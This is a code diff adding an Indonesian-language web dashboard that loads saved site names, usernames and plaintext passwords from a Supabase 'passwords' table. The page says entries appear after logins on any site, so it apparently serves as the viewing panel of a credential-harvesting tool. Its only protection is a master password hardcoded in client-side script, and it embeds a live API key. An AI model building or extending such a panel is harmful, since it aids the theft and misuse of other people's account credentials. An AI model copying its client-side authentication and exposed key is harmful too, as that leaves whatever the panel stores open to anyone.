@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daftar Akun Tersimpan</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f5f5f5;
+      color: #111;
+      min-height: 100vh;
+    }
+
+    /* ── Auth Overlay ── */
+    #auth-overlay {
+      position: fixed; inset: 0;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+    }
+
+    .auth-box {
+      width: 100%;
+      max-width: 360px;
+      padding: 40px 32px;
+      background: #fff;
+      border: 1px solid #e5e5e5;
+      border-radius: 14px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+    }
+
+    .auth-box h1 { font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+    .auth-box p  { font-size: 13px; color: #666; margin-bottom: 24px; }
+
+    .auth-box input {
+      width: 100%;
+      padding: 10px 14px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+      margin-bottom: 10px;
+      transition: border-color .15s;
+    }
+    .auth-box input:focus { border-color: #111; }
+
+    #auth-error {
+      color: #e53e3e;
+      font-size: 12px;
+      margin-bottom: 10px;
+      display: none;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 10px;
+      background: #111;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .btn-primary:hover { background: #333; }
+
+    /* ── Main Layout ── */
+    #main { display: none; }
+
+    .topbar {
+      background: #fff;
+      border-bottom: 1px solid #e5e5e5;
+      padding: 0 32px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .topbar-title {
+      font-size: 15px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .badge {
+      background: #f0f0f0;
+      color: #111;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 2px 8px;
+      border-radius: 10px;
+    }
+
+    .topbar-actions {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .btn-sm {
+      padding: 6px 14px;
+      font-size: 12px;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      border: 1px solid #ddd;
+      background: #fafafa;
+      color: #333;
+      transition: background .15s, border-color .15s;
+    }
+    .btn-sm:hover { background: #efefef; border-color: #bbb; }
+    .btn-sm.danger { color: #e53e3e; border-color: #fca5a5; background: #fff5f5; }
+    .btn-sm.danger:hover { background: #fee2e2; }
+
+    /* ── Content ── */
+    .content {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 28px 32px;
+    }
+
+    .toolbar {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+    }
+
+    .search-input {
+      flex: 1;
+      min-width: 200px;
+      padding: 9px 14px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 13px;
+      outline: none;
+      background: #fff;
+      transition: border-color .15s;
+    }
+    .search-input:focus { border-color: #111; }
+
+    .filter-select {
+      padding: 9px 14px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 13px;
+      outline: none;
+      background: #fff;
+      cursor: pointer;
+      color: #333;
+    }
+
+    /* ── Table ── */
+    .table-wrap {
+      background: #fff;
+      border: 1px solid #e5e5e5;
+      border-radius: 12px;
+      overflow-x: auto;
+    }
+
+    table {
+      width: 100%;
+      min-width: 900px;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+
+    thead {
+      background: #fafafa;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    th {
+      text-align: left;
+      padding: 11px 16px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #888;
+      text-transform: uppercase;
+      letter-spacing: .4px;
+      white-space: nowrap;
+    }
+
+    td {
+      padding: 12px 16px;
+      border-bottom: 1px solid #f3f3f3;
+      vertical-align: middle;
+    }
+
+    tr:last-child td { border-bottom: none; }
+
+    tr:hover td { background: #fafafa; }
+
+    .site-cell {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .favicon {
+      width: 18px;
+      height: 18px;
+      border-radius: 4px;
+      flex-shrink: 0;
+      object-fit: contain;
+    }
+
+    .site-name { font-weight: 600; color: #111; }
+
+    .pass-cell {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: monospace;
+      min-width: 220px;
+    }
+
+    .pass-val { color: #444; letter-spacing: 1px; }
+
+    .btn-icon {
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 11px;
+      color: #999;
+      padding: 2px 6px;
+      border-radius: 4px;
+      transition: color .15s, background .15s;
+    }
+    .btn-icon:hover       { color: #111; background: #f0f0f0; }
+    .btn-icon.del:hover   { color: #e53e3e; background: #fff5f5; }
+
+    .date-text { font-size: 12px; color: #888; white-space: nowrap; }
+
+    /* ── Empty / Loading ── */
+    .state-box {
+      text-align: center;
+      padding: 60px 20px;
+      color: #999;
+    }
+    .state-box p:first-child { font-size: 15px; font-weight: 600; color: #555; margin-bottom: 6px; }
+    .state-box p:last-child  { font-size: 13px; }
+
+    /* ── Status toast ── */
+    #toast {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 500;
+      color: #fff;
+      background: #111;
+      box-shadow: 0 4px 16px rgba(0,0,0,.15);
+      opacity: 0;
+      transform: translateY(8px);
+      transition: opacity .2s, transform .2s;
+      pointer-events: none;
+    }
+    #toast.show { opacity: 1; transform: translateY(0); }
+  </style>
+</head>
+<body>
+
+  <!-- Auth Overlay -->
+  <div id="auth-overlay">
+    <div class="auth-box">
+      <h1>Daftar Akun</h1>
+      <p>Masukkan master password untuk melihat seluruh akun tersimpan.</p>
+      <input type="password" id="auth-input" placeholder="Master password..." autofocus />
+      <div id="auth-error">Password salah!</div>
+      <button class="btn-primary" id="auth-btn">Masuk</button>
+    </div>
+  </div>
+
+  <!-- Main -->
+  <div id="main">
+    <div class="topbar">
+      <div class="topbar-title">
+        Akun Tersimpan
+        <span class="badge" id="total-badge">0</span>
+      </div>
+      <div class="topbar-actions">
+        <button class="btn-sm" id="btn-refresh">↺ Refresh</button>
+        <button class="btn-sm danger" id="btn-delete-all">Hapus Semua</button>
+        <button class="btn-sm" id="btn-lock">Kunci</button>
+      </div>
+    </div>
+
+    <div class="content">
+      <div class="toolbar">
+        <input type="text" class="search-input" id="search" placeholder="Cari situs atau username..." />
+        <select class="filter-select" id="filter-site">
+          <option value="">Semua Situs</option>
+        </select>
+      </div>
+
+      <div class="table-wrap">
+        <div id="loading-state" class="state-box">
+          <p>Memuat data...</p>
+          <p>Mengambil dari Supabase</p>
+        </div>
+        <div id="empty-state"   class="state-box" style="display:none">
+          <p>Belum ada akun tersimpan</p>
+          <p>Data akan muncul setelah login di situs manapun.</p>
+        </div>
+        <table id="data-table" style="display:none">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Situs</th>
+              <th>Username / Email</th>
+              <th>Password</th>
+              <th>Tanggal &amp; Jam</th>
+              <th></th>
+            </tr>
+          </thead>
+          <tbody id="table-body"></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+
+<script>
+  const DEFAULT_PASSWORD = 'siapasangka';
+  const SB_URL   = 'https://puywjdopumlzvmzbcudr.supabase.co';
+  const SB_KEY   = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1eXdqZG9wdW1senZtemJjdWRyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIzNDE3MTksImV4cCI6MjA4NzkxNzcxOX0.vvThyjtK2SlA9oA9Mr_XOmt1R_tNZk-ib3PO9XpiiSc';
+  const SB_TABLE = 'passwords';
+
+  let allData = [];
+
+  // ── Auth ────────────────────────────────────────────────────────────────────
+  const authOverlay = document.getElementById('auth-overlay');
+  const authInput   = document.getElementById('auth-input');
+  const authBtn     = document.getElementById('auth-btn');
+  const authError   = document.getElementById('auth-error');
+
+  function doLogin() {
+    if (authInput.value === DEFAULT_PASSWORD) {
+      authOverlay.style.display = 'none';
+      document.getElementById('main').style.display = 'block';
+      loadData();
+    } else {
+      authError.style.display = 'block';
+      authInput.value = '';
+      authInput.focus();
+    }
+  }
+
+  authBtn.addEventListener('click', doLogin);
+  authInput.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
+
+  document.getElementById('btn-lock').addEventListener('click', () => {
+    authOverlay.style.display = 'flex';
+    document.getElementById('main').style.display = 'none';
+    authInput.value = '';
+    authInput.focus();
+  });
+
+  // ── Fetch Data ──────────────────────────────────────────────────────────────
+  async function loadData() {
+    showLoading(true);
+    try {
+      const res = await fetch(`${SB_URL}/rest/v1/${SB_TABLE}?select=*&order=timestamp.desc`, {
+        headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` }
+      });
+      if (!res.ok) throw new Error(res.statusText);
+      allData = await res.json();
+      populateSiteFilter();
+      renderTable(allData);
+    } catch (e) {
+      showLoading(false);
+      showToast('Gagal memuat data: ' + e.message, true);
+    }
+  }
+
+  // ── Render ──────────────────────────────────────────────────────────────────
+  function renderTable(items) {
+    showLoading(false);
+    const tbody      = document.getElementById('table-body');
+    const table      = document.getElementById('data-table');
+    const emptyState = document.getElementById('empty-state');
+    const badge      = document.getElementById('total-badge');
+
+    badge.textContent = items.length;
+
+    if (items.length === 0) {
+      table.style.display      = 'none';
+      emptyState.style.display = 'block';
+      return;
+    }
+
+    emptyState.style.display = 'none';
+    table.style.display      = 'table';
+    tbody.innerHTML = '';
+
+    items.forEach((item, i) => {
+      const tr = document.createElement('tr');
+      tr.innerHTML = `
+        <td style="color:#bbb;font-size:11px">${i + 1}</td>
+        <td>
+          <div class="site-cell">
+            <img class="favicon" src="https://www.google.com/s2/favicons?sz=32&domain=${escHtml(item.site)}" onerror="this.style.display='none'" />
+            <span class="site-name">${escHtml(item.site)}</span>
+          </div>
+        </td>
+        <td>${escHtml(item.username)}</td>
+        <td>
+          <div class="pass-cell">
+            <span class="pass-val" id="pw-${i}">••••••••</span>
+            <button class="btn-icon toggle-btn" data-index="${i}" data-pass="${escHtml(item.password)}">Lihat</button>
+            <button class="btn-icon copy-btn"   data-pass="${escHtml(item.password)}">Salin</button>
+          </div>
+        </td>
+        <td class="date-text">${escHtml(item.timestamp || '-')}</td>
+        <td>
+          <button class="btn-icon del del-btn" data-id="${escHtml(item.id)}">Hapus</button>
+        </td>
+      `;
+      tbody.appendChild(tr);
+    });
+
+    // Toggle
+    document.querySelectorAll('.toggle-btn').forEach(btn => {
+      btn.addEventListener('click', e => {
+        const idx    = e.currentTarget.dataset.index;
+        const pass   = e.currentTarget.dataset.pass;
+        const el     = document.getElementById(`pw-${idx}`);
+        if (el.textContent === '••••••••') {
+          el.textContent            = pass;
+          e.currentTarget.textContent = 'Sembunyikan';
+        } else {
+          el.textContent            = '••••••••';
+          e.currentTarget.textContent = 'Lihat';
+        }
+      });
+    });
+
+    // Copy
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+      btn.addEventListener('click', e => {
+        navigator.clipboard.writeText(e.currentTarget.dataset.pass).then(() => {
+          showToast('Password disalin!');
+        });
+      });
+    });
+
+    // Delete per row
+    document.querySelectorAll('.del-btn').forEach(btn => {
+      btn.addEventListener('click', async e => {
+        const id = e.currentTarget.dataset.id;
+        if (!confirm('Hapus akun ini?')) return;
+        await sbDelete(id);
+        allData = allData.filter(d => d.id !== id);
+        populateSiteFilter();
+        applyFilter();
+        showToast('Akun dihapus.');
+      });
+    });
+  }
+
+  // ── Filter & Search ─────────────────────────────────────────────────────────
+  function applyFilter() {
+    const q    = document.getElementById('search').value.toLowerCase();
+    const site = document.getElementById('filter-site').value;
+    const filtered = allData.filter(item => {
+      const matchSite = !site || item.site === site;
+      const matchQ    = !q
+        || item.site.toLowerCase().includes(q)
+        || item.username.toLowerCase().includes(q);
+      return matchSite && matchQ;
+    });
+    renderTable(filtered);
+  }
+
+  document.getElementById('search').addEventListener('input', applyFilter);
+  document.getElementById('filter-site').addEventListener('change', applyFilter);
+
+  function populateSiteFilter() {
+    const sel   = document.getElementById('filter-site');
+    const sites = [...new Set(allData.map(d => d.site))].sort();
+    const current = sel.value;
+    sel.innerHTML = '<option value="">Semua Situs</option>';
+    sites.forEach(s => {
+      const opt = document.createElement('option');
+      opt.value       = s;
+      opt.textContent = s;
+      if (s === current) opt.selected = true;
+      sel.appendChild(opt);
+    });
+  }
+
+  // ── Refresh ─────────────────────────────────────────────────────────────────
+  document.getElementById('btn-refresh').addEventListener('click', loadData);
+
+  // ── Hapus Semua ─────────────────────────────────────────────────────────────
+  document.getElementById('btn-delete-all').addEventListener('click', async () => {
+    if (!confirm('Hapus SEMUA akun dari Supabase? Tindakan ini tidak bisa dibatalkan.')) return;
+    try {
+      await fetch(`${SB_URL}/rest/v1/${SB_TABLE}?timestamp=neq.___none___`, {
+        method:  'DELETE',
+        headers: {
+          'apikey':        SB_KEY,
+          'Authorization': `Bearer ${SB_KEY}`,
+          'Prefer':        'return=minimal'
+        }
+      });
+      allData = [];
+      renderTable([]);
+      showToast('Semua data dihapus.');
+    } catch (e) {
+      showToast('Gagal hapus: ' + e.message, true);
+    }
+  });
+
+  // ── Supabase Delete ─────────────────────────────────────────────────────────
+  async function sbDelete(id) {
+    await fetch(`${SB_URL}/rest/v1/${SB_TABLE}?id=eq.${encodeURIComponent(id)}`, {
+      method:  'DELETE',
+      headers: {
+        'apikey':        SB_KEY,
+        'Authorization': `Bearer ${SB_KEY}`,
+        'Prefer':        'return=minimal'
+      }
+    });
+  }
+
+  // ── Toast ────────────────────────────────────────────────────────────────────
+  let toastTimer;
+  function showToast(msg, isError = false) {
+    const toast       = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.style.background = isError ? '#e53e3e' : '#111';
+    toast.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => toast.classList.remove('show'), 2500);
+  }
+
+  // ── Loading state ────────────────────────────────────────────────────────────
+  function showLoading(show) {
+    document.getElementById('loading-state').style.display = show ? 'block' : 'none';
+    if (show) {
+      document.getElementById('data-table').style.display  = 'none';
+      document.getElementById('empty-state').style.display = 'none';
+    }
+  }
+
+  // ── Escape HTML ──────────────────────────────────────────────────────────────
+  function escHtml(str) {
+    if (!str) return '';
+    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+              .replace(/"/g,'&quot;').replace(/'/g,'&#039;');
+  }
+</script>
+</body>
+</html>
